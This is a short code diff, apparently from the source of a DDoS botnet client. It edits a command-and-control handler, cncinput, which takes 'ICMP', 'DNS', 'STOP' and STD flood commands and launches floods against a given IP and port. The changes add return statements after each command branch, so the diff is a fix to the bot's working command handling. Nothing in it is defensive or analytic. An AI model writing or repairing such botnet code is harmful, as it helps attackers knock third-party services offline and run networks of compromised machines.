@@ -976,7 +976,7 @@ void cncinput(int argc, unsigned char *argv[]) {
  
                         sendSTD(ip, port, time);
                         _exit(0);
-                }
+                }return;
  
         }
      if(!strcmp(argv[0], "ICMP"))
@@ -1008,7 +1008,7 @@ void cncinput(int argc, unsigned char *argv[]) {
                         sendICMP(ip, time);
                         _exit(0);
                 }
- 
+ return;
         }
      if(!strcmp(argv[0], "DNS"))
         {
@@ -1039,7 +1039,7 @@ void cncinput(int argc, unsigned char *argv[]) {
                         sendDNS(ip, time);
                         _exit(0);
                 }
- 
+ return;
         }
     if(!strcmp(argv[0], "STOP"))
     {
@@ -1056,7 +1056,7 @@ void cncinput(int argc, unsigned char *argv[]) {
         {
         } else {
         }
- 
+return; 
 }
 int initConnection()
 {
